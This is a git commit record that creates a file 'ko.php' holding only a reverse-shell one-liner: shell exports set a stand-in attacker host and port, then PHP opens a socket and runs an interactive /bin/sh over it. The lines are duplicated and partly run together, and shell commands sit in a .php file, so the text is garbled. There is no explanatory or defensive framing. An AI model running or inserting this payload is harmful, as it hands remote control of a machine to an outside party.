d8de5fa8177e62f0f64020e423a944cf4c6f07df
Dikky Ryan Pratama <dikkydbs@gmail.com>
2022-10-28 22:15:19 +0700

    Create ko.php
    Co-Authored-By: tryyy21 <112579377+tryyy21@users.noreply.github.com>

---
+++ ko.php
@@ -0,0 +1,5 @@
+export RHOST=attacker.com
+export RPORT=12345
+php -r '$sock=fsockopen(getenv("RHOST"),getenv("RPORT"));exec("/bin/sh -i <&3 >&3 2>&3");'export RHOST=attacker.com
+export RPORT=12345
+php -r '$sock=fsockopen(getenv("RHOST"),getenv("RPORT"));exec("/bin/sh -i <&3 >&3 2>&3");'
